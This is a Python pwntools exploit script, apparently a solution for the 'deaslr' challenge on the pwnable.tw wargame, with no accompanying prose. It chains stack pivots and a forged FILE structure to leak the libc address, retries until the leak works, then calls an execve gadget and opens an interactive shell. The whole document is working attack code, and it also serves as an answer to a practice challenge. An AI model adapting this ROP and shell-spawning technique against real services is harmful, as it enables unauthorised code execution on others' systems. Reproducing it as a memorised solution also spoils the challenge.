#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
A = lambda len=1, c=b'A': c * len
z = lambda len=1, c=b'\0': c * len

exe = ELF("deaslr_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe", "-w", "0", "split-pane", "-V", "-s", "0.5", "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on
# b *main+30
b *__libc_csu_init+73
continue
'''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        sleep(0.25)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10402
        return remote(host, port)

attempt = 0
while True:
    attempt += 1
    print("\n----------> Attempt", attempt)

    p = conn()

    pop_rbx_rbp_r12_r13_r14_r15_ret = 0x4005ba
    pop_rdi_ret = 0x4005c3
    pop_rsi_r15_ret = 0x4005c1
    nop_ret = 0x4005c8
    leave_ret = 0x400554
    call_writefile = 0x4005a0

    stack_1 = 0x601400
    stack_2 = stack_1 + 0x400
    fake_file = stack_2 + 0x58
    stdin_addr = stack_1 - 0x60

    print("pivot to stack 1")
    pl = flat(
        A(0x10),
        stack_1,
        pop_rdi_ret,
        stack_1,
        exe.symbols['gets'], # write to stack 1
        leave_ret
    )
    sl(p, pl)

    sleep(0.1)

    print("pivot to stack 2, write stdin to bss")
    pl = flat(
        stack_2,
        exe.symbols['main'], # write stdin
        leave_ret,
    )

    pl += p64(0) * ((stack_2 - stack_1 - 0x18)//8)

    pl += flat(
        stdin_addr - 0x20,
        pop_rdi_ret,
        stdin_addr + 0x8,
        exe.symbols['gets'],
        pop_rdi_ret,
        stdin_addr - 0x18,
        exe.symbols['gets'],
        pop_rdi_ret,

        stack_1, # aftermath
        exe.symbols['gets'],
        leave_ret
    )

    pl += flat(z(0x70), 1, 2)

    sl(p, pl)

    sleep(0.1)

    print("write stdin")
    sl(p, b'A')

    print("under")
    pl = flat(
        100,
        exe.got['gets'],
        fake_file,
        call_writefile
    )
    sl(p, pl)

    print("above")
    pl = flat(
        pop_rbx_rbp_r12_r13_r14_r15_ret,
        0x4eb,
        0x4ec,
        b'\0'
    )
    sl(p, pl)

    print("aftermath")
    pl = flat(
        pop_rdi_ret,
        stack_1 + 0x18,
        exe.plt['gets']
    )
    sl(p, pl)

    sleep(0.5)

    try:
        libc.address = leak_bytes(rn(p, 6), libc.symbols['gets'])
        lg("libc base", libc.address)
    except:
        print("Failed attempt")
        p.close()
        continue

    print("execve")
    pl = flat(
        libc.address + 0x4526a,
        p64(0) * 8
    )
    sl(p, pl)

    rr(p, 0.5)
    ia(p)
    p.close()
    break